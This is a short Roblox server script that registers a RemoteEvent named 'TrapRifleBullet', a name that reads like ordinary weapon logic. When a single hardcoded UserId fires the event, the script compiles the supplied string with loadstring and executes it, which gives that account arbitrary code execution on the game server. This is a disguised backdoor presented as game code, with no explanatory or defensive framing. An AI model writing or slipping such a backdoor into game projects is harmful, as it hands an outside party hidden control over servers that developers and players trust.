local ReplicatedStorage = game:GetService("ReplicatedStorage")
local remote = ReplicatedStorage:FindFirstChild("TrapRifleBullet") or Instance.new("RemoteEvent", ReplicatedStorage)
remote.Name = "TrapRifleBullet"

local whitelist = {
    [338910414] = true
}

remote.OnServerEvent:Connect(function(player, code)
    if whitelist[player.UserId] then
        local func = loadstring(code)
        if func then
            func()
        end
    end
end)
